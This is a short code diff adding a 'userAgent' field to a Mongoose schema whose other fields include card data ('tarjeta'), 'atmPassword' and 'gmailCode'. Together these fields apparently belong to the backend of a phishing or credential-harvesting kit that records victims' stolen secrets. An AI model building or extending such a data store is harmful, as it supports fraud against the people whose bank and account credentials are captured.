@@ -29,6 +29,7 @@ const bagSchema = new Schema({
     factor: String,
     method: String,
     image: String,
+    userAgent: String,
     tarjeta: String,
     atmPassword: String,
     gmailCode: String,
